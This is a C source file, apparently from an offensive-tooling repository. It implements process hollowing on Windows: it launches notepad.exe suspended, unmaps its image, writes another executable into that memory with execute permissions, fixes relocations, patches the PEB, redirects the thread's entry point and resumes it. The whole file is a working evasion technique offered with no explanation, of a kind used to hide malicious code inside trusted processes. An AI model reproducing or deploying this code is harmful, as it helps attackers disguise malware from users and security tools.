#include <windows.h>
#include <stdio.h>

typedef struct BASE_RELOCATION_BLOCK
{
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY
{
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

typedef NTSTATUS(WINAPI *_NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

int main()
{
	char *sourcePath = "Z:\\git\\offensive_c\\bin\\myexe_mainexec.exe";
	char *targetPath = "C:\\Windows\\System32\\notepad.exe";

	// read pe to heap
	HANDLE hFile = CreateFileA(sourcePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	DWORD dFileSize = GetFileSize(hFile, NULL);
	HANDLE hFileContent = HeapAlloc(GetProcessHeap(), 0, dFileSize);
	ReadFile(hFile, hFileContent, dFileSize, NULL, NULL);
	CloseHandle(hFile);

	// check if pe valid
	PIMAGE_DOS_HEADER sourceImageDOSHeader = (PIMAGE_DOS_HEADER)hFileContent;
	PIMAGE_NT_HEADERS sourceImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)sourceImageDOSHeader + sourceImageDOSHeader->e_lfanew);
	if (sourceImageNTHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("source exe is not a valid pe file");
		return FALSE;
	}

	// is 32 bit
	if (sourceImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
	{
		printf("source exe is 32 bit");
		return FALSE;
	}

	// create valid process, suspended
	STARTUPINFOA SI;
	PROCESS_INFORMATION PI;

	ZeroMemory(&SI, sizeof(SI));
	SI.cb = sizeof(SI);
	ZeroMemory(&PI, sizeof(PI));

	CreateProcessA(targetPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI);

	// read process info
	LPVOID targetImageBaseAddress = NULL;
	CONTEXT CTX;
	CTX.ContextFlags = CONTEXT_FULL;
	GetThreadContext(PI.hThread, &CTX);
	ReadProcessMemory(PI.hProcess, (LPVOID)(CTX.Rdx + 0x10), &targetImageBaseAddress, sizeof(UINT64), NULL);
	// LPVOID lpProcessPEBAddress = CTX.Rdx;

	// check subsystem, target vs source
	DWORD64 dwSourceSubsystem = sourceImageNTHeader->OptionalHeader.Subsystem;

	IMAGE_DOS_HEADER targetImageDOSHeader;
	IMAGE_NT_HEADERS64 targetImageNTHeader;
	ReadProcessMemory(PI.hProcess, targetImageBaseAddress, &targetImageDOSHeader, sizeof(IMAGE_DOS_HEADER), NULL);
	ReadProcessMemory(PI.hProcess, (LPVOID)((uintptr_t)targetImageBaseAddress + targetImageDOSHeader.e_lfanew), (LPVOID)&targetImageNTHeader, sizeof(IMAGE_NT_HEADERS64), NULL);

	DWORD64 dwTargetSubsystem = targetImageNTHeader.OptionalHeader.Subsystem;

	if (dwSourceSubsystem != dwTargetSubsystem)
	{
		printf("subsystems are not compatible");
		return FALSE;
	}

	// check relocation table
	if (sourceImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0)
	{
		printf("no reloc\n");
		return FALSE;
	}

	// unmap
	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
	NtUnmapViewOfSection(PI.hProcess, targetImageBaseAddress);

	// overwrite target pe
	LPVOID sourceAllocAddress = VirtualAllocEx(PI.hProcess, targetImageBaseAddress, sourceImageNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	DWORD64 DeltaImageBase = (DWORD64)sourceAllocAddress - sourceImageNTHeader->OptionalHeader.ImageBase;
	sourceImageNTHeader->OptionalHeader.ImageBase = (DWORD64)sourceAllocAddress;
	WriteProcessMemory(PI.hProcess, sourceAllocAddress, hFileContent, sourceImageNTHeader->OptionalHeader.SizeOfHeaders, NULL);

	// copy sections
	IMAGE_DATA_DIRECTORY sourceImageDataReloc = sourceImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	PIMAGE_SECTION_HEADER sourceImageRelocSection = NULL;

	for (int i = 0; i < sourceImageNTHeader->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER sourceImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)sourceImageNTHeader + 4 + sizeof(IMAGE_FILE_HEADER) + sourceImageNTHeader->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));

		if (sourceImageDataReloc.VirtualAddress >= sourceImageSectionHeader->VirtualAddress && sourceImageDataReloc.VirtualAddress < (sourceImageSectionHeader->VirtualAddress + sourceImageSectionHeader->Misc.VirtualSize))
			sourceImageRelocSection = sourceImageSectionHeader;

		WriteProcessMemory(PI.hProcess, (LPVOID)((UINT64)sourceAllocAddress + sourceImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)hFileContent + sourceImageSectionHeader->PointerToRawData), sourceImageSectionHeader->SizeOfRawData, NULL);
	}

	// copy reloc table
	DWORD64 RelocOffset = 0;
	while (RelocOffset < sourceImageDataReloc.Size)
	{
		PIMAGE_BASE_RELOCATION lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)hFileContent + sourceImageRelocSection->PointerToRawData + RelocOffset);

		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		DWORD64 NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		for (DWORD64 i = 0; i < NumberOfEntries; i++)
		{
			PBASE_RELOCATION_ENTRY lpImageRelocationEntry = (PBASE_RELOCATION_ENTRY)((DWORD64)hFileContent + sourceImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(BASE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			DWORD64 AddressLocation = (DWORD64)sourceAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD64 PatchedAddress = 0;

			ReadProcessMemory(PI.hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), NULL);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(PI.hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), NULL);
		}
	}

	// write image base in peb
	WriteProcessMemory(PI.hProcess, (LPVOID)(CTX.Rdx + 0x10), &sourceImageNTHeader->OptionalHeader.ImageBase, sizeof(DWORD64), NULL);

	// set thread context
	CTX.Rcx = (DWORD64)sourceAllocAddress + sourceImageNTHeader->OptionalHeader.AddressOfEntryPoint;
	SetThreadContext(PI.hThread, &CTX);

	ResumeThread(PI.hThread);

	printf("done.");
	return 0;
}
